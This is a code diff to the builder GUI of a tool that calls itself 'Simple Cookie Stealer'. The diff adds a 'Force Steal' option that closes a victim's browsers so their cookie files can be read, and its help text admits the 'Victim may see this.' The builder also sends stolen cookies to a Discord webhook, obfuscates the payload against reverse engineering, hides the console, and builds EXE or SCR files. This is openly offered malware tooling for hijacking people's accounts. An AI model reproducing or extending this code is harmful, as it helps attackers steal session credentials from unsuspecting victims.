@@ -20,6 +20,7 @@ version = "1.0"
 webhook = "" # Webhook URL
 obfuscate = False # Obfuscate the payload
 hideConsole = False # Hide the console when the payload is ran
+forceRead = False
 virtualenvir = False
 inputFileName = "" # Input file name
 comboBoxFileType = "EXE" # File type
@@ -36,6 +37,7 @@ def build():
     filename = _filename + "_tmp.py"
 
     data = data.replace("WEBHOOK GOES HERE", webhook)
+    data = data.replace("forceRead = False", f"forceRead = {forceRead}")
 
     if obfuscate:
         randomXor = random.randint(1, 255)
@@ -100,16 +102,18 @@ class GUI(customtkinter.CTk):
         self.buildButton = customtkinter.CTkButton(master=self.configFrame, text="Build", width=132, command=self.handleBuildButton)
         self.buildButton.place(x=410, y=5)
 
+        self.boxForceSteal = customtkinter.CTkCheckBox(master=self.configFrame, text="Force Steal", command=self.handleBoxForceRead)
         self.boxObfuscate = customtkinter.CTkCheckBox(master=self.configFrame, text="Obfuscate EXE", command=self.handleBoxObfuscate)
         self.boxHideConsole = customtkinter.CTkCheckBox(master=self.configFrame, text="Hide Console", command=self.handleBoxHideConsole)
         boxVirtualCompiler = customtkinter.CTkCheckBox(master=self.configFrame, text="Virtual Compiling Environment", command=self.handleBoxVirtualCompiler)
         self.inputFileName = customtkinter.CTkEntry(master=self.configFrame, width=200, placeholder_text="Input File Name")
         self.comboBoxFileType = customtkinter.CTkComboBox(master=self.configFrame, width=70, values=["EXE", "SCR", "COM", "BAT", "CMD"], command=self.handleComboBoxFileType)
-        self.boxObfuscate.place(x=5, y=40)
-        self.boxHideConsole.place(x=5, y=70)
-        boxVirtualCompiler.place(x=5, y=100)
-        self.inputFileName.place(x=5, y=130)
-        self.comboBoxFileType.place(x=210, y=130)
+        self.boxForceSteal.place(x=5, y=40)
+        self.boxObfuscate.place(x=5, y=70)
+        self.boxHideConsole.place(x=5, y=100)
+        boxVirtualCompiler.place(x=5, y=130)
+        self.inputFileName.place(x=5, y=160)
+        self.comboBoxFileType.place(x=210, y=160)
 
         self.creditText = customtkinter.CTkTextbox(master=self.creditFrame, width=537, height=390, fg_color="#292929")
         self.creditText.insert(END, f"""Simple Cookie Stealer v{version}
@@ -126,6 +130,7 @@ PyInstaller - EXE Builder (https://www.pyinstaller.org/)
 pycryptodome - pycryptodome library (https://pypi.org/project/pycryptodome/)
 pywin32 - pywin32 library (https://pypi.org/project/pywin32/)
 requests - requests library (https://pypi.org/project/requests/)
+StackOverflow - Find process using file (https://stackoverflow.com/questions/39570207/what-process-is-using-a-given-file)
 Python - Programming Language (https://www.python.org/)
                                
 And you! Thanks for using Simple Cookie Stealer!
@@ -135,8 +140,12 @@ And you! Thanks for using Simple Cookie Stealer!
 
         self.helpText = customtkinter.CTkTextbox(master=self.helpFrame, width=537, height=390, fg_color="#292929")
         self.helpText.insert(END, """Welcome to Simple Cookie Stealer!
+                             
 Webhook:
 Discord Webhook URL to send the cookies to.
+
+Force Steal:
+Some Browsers lock Cookie files. When enabled, it will close Browsers to unlock files. Victim may see this.
 
 Obfuscate EXE:
 Obfuscate the EXE file to make it harder to reverse engineer.
@@ -212,6 +221,10 @@ Yes, I know there isn't much here. It's a SIMPLE Cookie Stealer :)
 
         ctypes.windll.user32.MessageBoxW(0, "Build Complete!", "Success", 0)
     
+    def handleBoxForceRead(self):
+        global forceRead
+        forceRead = not forceRead
+
     def handleBoxVirtualCompiler(self):
         global virtualenvir
         virtualenvir = not virtualenvir
